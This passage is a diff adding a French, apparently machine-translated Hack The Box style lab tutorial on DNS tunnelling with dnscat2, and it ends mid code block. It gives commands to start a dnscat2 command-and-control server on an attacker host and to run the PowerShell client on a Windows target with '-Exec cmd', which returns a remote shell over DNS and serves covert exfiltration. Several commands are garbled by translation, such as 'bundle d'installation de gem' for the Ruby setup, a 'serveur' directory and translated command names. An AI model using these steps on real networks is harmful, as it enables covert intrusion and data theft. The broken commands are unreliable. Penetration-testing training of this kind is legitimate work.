@@ -1,0 +1,138 @@
+Tunnellisation DNS avec Dnscat2
+==========================
+
+* * * * *
+
+[Dnscat2](https://github.com/iagox86/dnscat2) est un outil de tunnellisation qui utilise le protocole DNS pour envoyer des données entre deux hôtes. Il utilise un canal `Command-&-Control` (`C&C` ou `C2`) chiffré et envoie des données dans des enregistrements TXT au sein du protocole DNS. Habituellement, chaque environnement de domaine Active Directory dans un réseau d'entreprise aura son propre serveur DNS, qui résoudra les noms d'hôte en adresses IP et acheminera le trafic vers des serveurs DNS externes participant au système DNS global. Cependant, avec dnscat2, la résolution d'adresse est demandée à un serveur externe. Lorsqu'un serveur DNS local tente de résoudre une adresse, les données sont exfiltrées et envoyées sur le réseau au lieu d'une requête DNS légitime. Dnscat2 peut être une approche extrêmement furtive pour exfiltrer des données tout en évitant les détections de pare-feu qui suppriment les connexions HTTPS et reniflent le trafic. Pour notre exemple de test, nous pouvons utiliser le serveur dnscat2 sur notre hôte d'attaque et exécuter le client dnscat2 sur un autre hôte Windows.
+
+* * * * *
+
+Configuration et utilisation de dnscat2
+--------------------------
+
+Si dnscat2 n'est pas déjà configuré sur notre hôte d'attaque, nous pouvons le faire en utilisant les commandes suivantes :
+
+#### Clonage dnscat2 et configuration du serveur
+
+Clonage de dnscat2 et configuration du serveur
+
+```
+dsgsec@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git
+
+cd dnscat2/serveur/
+bundle d'installation de gem
+installation groupée
+
+```
+
+Nous pouvons ensuite démarrer le serveur dnscat2 en exécutant le fichier dnscat2.
+
+#### Démarrage du serveur dnscat2
+
+Démarrage du serveur dnscat2
+
+```
+dsgsec@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+
+Nouvelle fenêtre créée : 0
+dnscat2> Nouvelle fenêtre créée : crypto-debug
+Bienvenue sur dnscat2 ! Certains documents peuvent être obsolètes.
+
+attachement_auto => faux
+history_size (pour les nouvelles fenêtres) => 1000
+Politique de sécurité modifiée : toutes les connexions doivent être cryptées
+Nouvelle fenêtre créée : dns1
+Démarrage du serveur DNS Dnscat2 le 10.10.14.18:53
+[domaines = inlanefreight.local]...
+
+En supposant que vous ayez un serveur DNS faisant autorité, vous pouvez exécuter
+le client n'importe où avec ce qui suit (--secret est facultatif) :
+
+   ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
+
+Pour parler directement au serveur sans nom de domaine, exécutez :
+
+   ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
+
+Bien sûr, vous devez découvrir <serveur> vous-même ! Clients
+se connectera directement sur le port UDP 53.
+
+```
+
+Après avoir exécuté le serveur, il nous fournira la clé secrète, que nous devrons fournir à notre client dnscat2 sur l'hôte Windows afin qu'il puisse authentifier et chiffrer les données envoyées à notre serveur dnscat2 externe. Nous pouvons utiliser le client avec le projet dnscat2 ou utiliser [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell), un client basé sur PowerShell compatible dnscat2 que nous pouvons exécuter à partir de cibles Windows pour établir un tunnel avec notre serveur dnscat2. Nous pouvons cloner le projet contenant le fichier client sur notre hôte d'attaque, puis le transférer sur la cible.
+
+#### Clonage de dnscat2-powershell sur l'hôte d'attaque
+
+Clonage de dnscat2-powershell sur l'hôte d'attaque
+
+```
+dsgsec@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
+
+```
+
+Une fois le fichier `dnscat2.ps1` sur la cible, nous pouvons l'importer et exécuter les cmdlets associés.
+
+#### Importation de dnscat2.ps1
+
+Importation de dnscat2.ps1
+
+```
+PS C:\htb> Import-Module .\dnscat2.ps1
+
+```
+
+Une fois dnscat2.ps1 importé, nous pouvons l'utiliser pour établir un tunnel avec le serveur exécuté sur notre hôte d'attaque. Nous pouvons renvoyer une session shell CMD à notre serveur.
+
+Importation de dnscat2.ps1
+
+```
+PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+
+```
+
+Nous devons utiliser le secret pré-partagé (`-PreSharedSecret`) généré sur le serveur pour nous assurer que notre session est établie et cryptée. Si toutes les étapes sont terminées avec succès, nous verrons une session établie avec notre serveur.
+
+#### Confirmation de l'établissement de la session
+
+Confirmation de l'établissement de la session
+
+```
+Nouvelle fenêtre créée : 1
+Séance 1 Sécurité : CRYPTÉE ET VÉRIFIÉE !
+(la sécurité dépend de la force de votre secret pré-partagé !)
+
+dnscat2>
+
+```
+
+Nous pouvons répertorier les options dont nous disposons avec dnscat2 en saisissant `?` à l'invite.
+
+#### Liste des options dnscat2
+
+Liste des options dnscat2
+
+```
+dnscat2> ?
+
+Voici une liste de commandes (utilisez -h sur l'une d'entre elles pour une aide supplémentaire) :
+* écho
+* aider
+* tuer
+* arrêter
+* ensemble
+* commencer
+* arrêt
+* tunnels
+* non défini
+* fenêtre
+* les fenêtres
+
+```
+
+Nous pouvons utiliser dnscat2 pour interagir avec les sessions et aller plus loin dans un environnement cible sur les engagements. Nous ne couvrirons pas toutes les possibilités avec dnscat2 dans ce module, mais il est fortement encouragé de s'entraîner avec lui et peut-être même de trouver des façons créatives de l'utiliser lors d'un engagement. Interagissons avec notre session établie et plongeons dans un shell.
+
+#### Interagir avec la session établie
+
+Interagir avec la session établie
+
+``
